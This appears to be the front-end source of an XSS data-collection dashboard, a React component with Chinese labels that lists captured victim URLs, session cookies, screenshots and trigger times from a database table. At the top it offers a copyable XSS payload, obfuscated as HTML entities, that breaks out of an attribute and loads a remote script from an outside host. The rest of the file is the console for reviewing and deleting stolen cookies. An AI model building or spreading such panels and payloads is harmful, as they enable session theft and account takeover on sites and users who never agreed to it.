import { useEffect, useState } from 'react';
import { supabase } from '../utils/supabaseClient';
import Image from 'next/image';



export default function DisplayTable() {
  const [data, setData] = useState([]);
  const [expandedRows, setExpandedRows] = useState({});
  const [selectedImage, setSelectedImage] = useState(null);
  const [showCopySuccess, setShowCopySuccess] = useState(false);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const { data: fetchedData, error } = await supabase
          .from('xss')
          .select('id, url, cookie, screenshot, trigger_time');
        if (error) {
          console.error('获取数据时出错:', error);
        } else {
          setData(fetchedData);
        }
      } catch (error) {
        console.error('处理请求时出错:', error);
      } finally {
        setLoading(false);
      }
    };
    fetchData();
  }, []);

  const handleDelete = async (id) => {
    if (!window.confirm('确定要删除这条记录吗？')) return;
    try {
      const { error } = await supabase.from('xss').delete().eq('id', id);
      if (error) {
        alert('删除失败');
      } else {
        setData((prev) => prev.filter((item) => item.id !== id));
        alert('删除成功');
      }
    } catch (err) {
      console.error('删除错误:', err);
      alert('删除失败');
    }
  };

  const handleDeleteAll = async () => {
    if (!window.confirm('⚠️ 确定要删除所有记录吗？此操作不可恢复！')) return;
    try {
      const { error } = await supabase.from('xss').delete().neq('id', 0);
      if (error) {
        alert('批量删除失败');
      } else {
        setData([]);
        alert('所有记录已清空');
      }
    } catch (err) {
      console.error('批量删除错误:', err);
      alert('操作失败');
    }
  };

  const decodeHtml = (html) => {
    const txt = document.createElement('textarea');
    txt.innerHTML = html;
    return txt.value;
  };

  const handleCopy = (text) => {
    const decodedText = decodeHtml(text);
    navigator.clipboard.writeText(decodedText).then(
      () => {
        setShowCopySuccess(true);
        setTimeout(() => setShowCopySuccess(false), 1500);
      },
      (err) => {
        console.error('复制失败:', err);
        alert('复制失败');
      }
    );
  };

  const toggleExpand = (id) => {
    setExpandedRows((prev) => ({
      ...prev,
      [id]: !prev[id],
    }));
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.title}>🔐 XSS 数据监控</h1>

      {/* XSS Payload 提示区 */}
      <div style={styles.codeContainer}>
        <code style={styles.codeSpan}>
        &#39;&#34;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#34;&#105;&#109;&#112;&#111;&#114;&#116;&#40;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#46;&#98;&#101;&#105;&#115;&#104;&#97;&#110;&#120;&#117;&#101;&#121;&#117;&#97;&#110;&#46;&#99;&#111;&#109;&#47;&#50;&#46;&#106;&#115;&#39;&#41;&#34;&#62;
        </code>
        <button onClick={() => handleCopy(
          "&#39;&#34;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#34;&#105;&#109;&#112;&#111;&#114;&#116;&#40;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#46;&#98;&#101;&#105;&#115;&#104;&#97;&#110;&#120;&#117;&#101;&#121;&#117;&#97;&#110;&#46;&#99;&#111;&#109;&#47;&#50;&#46;&#106;&#115;&#39;&#41;&#34;&#62;"
        )} style={styles.copyButton}>
          复制
        </button>
        {showCopySuccess && <div style={styles.copySuccess}>✅ 复制成功</div>}
      </div>

      {/* 全部删除按钮 */}
      {data.length > 0 && (
        <button onClick={handleDeleteAll} style={styles.deleteAllButton}>
          🗑️ 清空所有记录
        </button>
      )}

      {/* 加载状态 */}
      {loading ? (
        <div style={styles.loading}>加载中...</div>
      ) : (
        <table style={styles.table}>
          <thead>
            <tr>
              <th style={styles.th}>ID</th>
              <th style={styles.th}>URL</th>
              <th style={styles.th}>Cookie</th>
              <th style={styles.th}>截图</th>
              <th style={styles.th}>触发时间</th>
              <th style={styles.th}>操作</th>
            </tr>
          </thead>
          <tbody>
            {data.length > 0 ? (
              data.map((item) => (
                <tr key={item.id} style={styles.row}>
                  <td style={styles.td}>{item.id}</td>
                  <td style={styles.td}>
                    <a href={item.url} target="_blank" rel="noopener noreferrer" style={styles.link}>
                      {expandedRows[item.id] ? item.url : `${item.url.slice(0, 30)}...`}
                    </a>
                    <button onClick={() => toggleExpand(item.id)} style={styles.expandButton}>
                      {expandedRows[item.id] ? '▴ 收起' : '▾ 展开'}
                    </button>
                  </td>
                  <td style={styles.td}>
                    <div style={{ display: 'flex', alignItems: 'center' }}>
                      <span style={{ flex: 1 }}>
                        {expandedRows[item.id] ? item.cookie : `${item.cookie.slice(0, 30)}...`}
                      </span>
                      <button onClick={() => toggleExpand(item.id)} style={styles.expandButton}>
                        {expandedRows[item.id] ? '▴' : '▾'}
                      </button>
                    </div>
                  </td>
                  <td style={styles.td}>
                    {item.screenshot ? (
                      <Image
                        src={item.screenshot}
                        alt="截图"
                        width={60}
                        height={40}
                        style={styles.thumbnail}
                        onClick={() => setSelectedImage(item.screenshot)}
                      />
                    ) : (
                      <span style={{ color: '#6b7280', fontSize: '12px' }}>无截图</span>
                    )}
                  </td>
                  <td style={styles.td}>
                    {new Date(item.trigger_time).toLocaleString()}
                  </td>
                  <td style={styles.td}>
                    <button onClick={() => handleDelete(item.id)} style={styles.deleteButton}>
                      ❌ 删除
                    </button>
                  </td>
                </tr>
              ))
            ) : (
              <tr>
                <td colSpan="6" style={styles.noDataCell}>
                  {loading ? '加载中...' : '📭 暂无 XSS 数据记录'}
                </td>
              </tr>
            )}
          </tbody>
        </table>
      )}

      {/* 大图预览弹窗 */}
      {selectedImage && (
        <div style={styles.modalOverlay} onClick={() => setSelectedImage(null)}>
          <div style={styles.modalContent} onClick={(e) => e.stopPropagation()}>
            <button style={styles.closeButton} onClick={() => setSelectedImage(null)}>
              ×
            </button>
            <Image
              src={selectedImage}
              alt="大图预览"
              width={1000}
              height={600}
              style={styles.largeImage}
              priority
            />
          </div>
        </div>
      )}
    </div>
  );
}

// 样式优化（更统一、更现代）
const styles = {
  container: {
    padding: '32px 20px',
    fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
    maxWidth: '1400px',
    margin: '0 auto',
    backgroundColor: '#0d0d0d', // 更深的背景
    color: '#e0e0e0',
    minHeight: '100vh',
    boxSizing: 'border-box',
  },
  title: {
    textAlign: 'center',
    marginBottom: '28px',
    fontSize: '36px',
    fontWeight: 800,
    color: '#ffffff',
    letterSpacing: '-0.02em',
    textShadow: '0 2px 8px rgba(0, 0, 0, 0.5)',
  },
  codeContainer: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: '28px',
    position: 'relative',
    backgroundColor: '#1a1a1a',
    padding: '16px',
    borderRadius: '12px',
    border: '1px solid #333',
    boxShadow: '0 6px 20px rgba(0, 0, 0, 0.4)',
  },
  codeSpan: {
    backgroundColor: '#252525',
    padding: '12px 16px',
    borderRadius: '8px',
    marginRight: '16px',
    fontFamily: "'JetBrains Mono', monospace",
    fontSize: '14px',
    color: '#a0d8ff',
    border: '1px solid #444',
    wordBreak: 'break-all',
    flex: 1,
  },
  copyButton: {
    padding: '10px 20px',
    background: 'linear-gradient(45deg, #3b82f6, #58a6ff)',
    color: '#fff',
    border: 'none',
    borderRadius: '8px',
    cursor: 'pointer',
    fontWeight: 600,
    transition: 'all 0.3s ease',
    boxShadow: '0 4px 12px rgba(59, 130, 246, 0.3)',
  },
  copyButtonHover: {
    background: 'linear-gradient(45deg, #2563eb, #4d94ff)',
    transform: 'translateY(-1px)',
    boxShadow: '0 6px 16px rgba(59, 130, 246, 0.4)',
  },
  copySuccess: {
    position: 'absolute',
    top: '-44px',
    right: '16px',
    backgroundColor: '#10b981',
    color: '#fff',
    padding: '8px 16px',
    borderRadius: '8px',
    fontSize: '13px',
    fontWeight: 500,
    boxShadow: '0 4px 12px rgba(16, 185, 129, 0.3)',
    animation: 'fadeInOut 1.5s ease',
  },
  deleteAllButton: {
    display: 'block',
    margin: '28px auto',
    padding: '12px 28px',
    background: 'linear-gradient(45deg, #ef4444, #f45757)',
    color: '#fff',
    border: 'none',
    borderRadius: '10px',
    cursor: 'pointer',
    fontSize: '16px',
    fontWeight: 600,
    transition: 'all 0.3s ease',
    boxShadow: '0 4px 14px rgba(239, 68, 68, 0.3)',
  },
  deleteAllButtonHover: {
    background: 'linear-gradient(45deg, #dc2626, #ef4444)',
    transform: 'translateY(-1px)',
    boxShadow: '0 6px 18px rgba(239, 68, 68, 0.4)',
  },
  loading: {
    textAlign: 'center',
    color: '#9ca3af',
    fontSize: '18px',
    padding: '40px',
  },
  table: {
    width: '100%',
    borderCollapse: 'separate',
    borderSpacing: 0,
    backgroundColor: '#1a1a1a',
    borderRadius: '14px',
    overflow: 'hidden',
    boxShadow: '0 8px 24px rgba(0, 0, 0, 0.4)',
    border: '1px solid #333',
  },
  th: {
    padding: '16px',
    backgroundColor: '#222',
    color: '#9ca3af',
    fontWeight: 600,
    fontSize: '13px',
    textTransform: 'uppercase',
    letterSpacing: '0.05em',
    borderBottom: '2px solid #444',
  },
  row: {
    transition: 'background-color 0.3s ease',
    ':hover': {
      backgroundColor: '#262626',
    },
  },
  td: {
    padding: '16px',
    borderBottom: '1px solid #333',
    color: '#d1d5db',
    fontSize: '14px',
    verticalAlign: 'middle',
  },
  link: {
    color: '#60a5fa',
    textDecoration: 'none',
    fontWeight: 500,
    transition: 'color 0.3s ease',
  },
  linkHover: {
    color: '#93c5fd',
    textDecoration: 'underline',
  },
  expandButton: {
    marginLeft: '10px',
    padding: '5px 10px',
    background: '#404040',
    color: '#d1d5db',
    border: '1px solid #555',
    borderRadius: '6px',
    cursor: 'pointer',
    fontSize: '12px',
    fontWeight: 500,
    transition: 'all 0.2s ease',
  },
  expandButtonHover: {
    background: '#525252',
    borderColor: '#666',
    transform: 'scale(1.03)',
  },
  thumbnail: {
    cursor: 'pointer',
    objectFit: 'cover',
    borderRadius: '6px',
    border: '1px solid #444',
    transition: 'all 0.3s ease',
  },
  thumbnailHover: {
    transform: 'scale(1.08)',
    boxShadow: '0 6px 16px rgba(0, 0, 0, 0.4)',
  },
  deleteButton: {
    padding: '6px 12px',
    background: '#dc2626',
    color: '#fff',
    border: 'none',
    borderRadius: '6px',
    cursor: 'pointer',
    fontSize: '12px',
    fontWeight: 500,
    transition: 'all 0.2s ease',
  },
  deleteButtonHover: {
    background: '#b91c1c',
    transform: 'scale(1.05)',
  },
  noDataCell: {
    textAlign: 'center',
    padding: '40px 16px',
    color: '#6b7280',
    fontSize: '16px',
    fontStyle: 'italic',
  },
  modalOverlay: {
    position: 'fixed',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: 'rgba(0, 0, 0, 0.95)',
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    zIndex: 1000,
    backdropFilter: 'blur(4px)',
  },
  modalContent: {
    backgroundColor: '#1a1a1a',
    borderRadius: '16px',
    overflow: 'hidden',
    maxWidth: '95vw',
    maxHeight: '95vh',
    position: 'relative',
    boxShadow: '0 20px 40px rgba(0, 0, 0, 0.6)',
    border: '1px solid #444',
  },
  largeImage: {
    objectFit: 'contain',
    borderRadius: '8px',
    maxWidth: '100%',
    maxHeight: '90vh',
  },
  closeButton: {
    position: 'absolute',
    top: '16px',
    right: '16px',
    background: '#333',
    color: '#fff',
    border: 'none',
    borderRadius: '50%',
    width: '40px',
    height: '40px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    cursor: 'pointer',
    fontSize: '20px',
    fontWeight: 'bold',
    transition: 'all 0.3s ease',
    zIndex: 1100,
  },
  closeButtonHover: {
    background: '#555',
    transform: 'scale(1.1)',
  },
};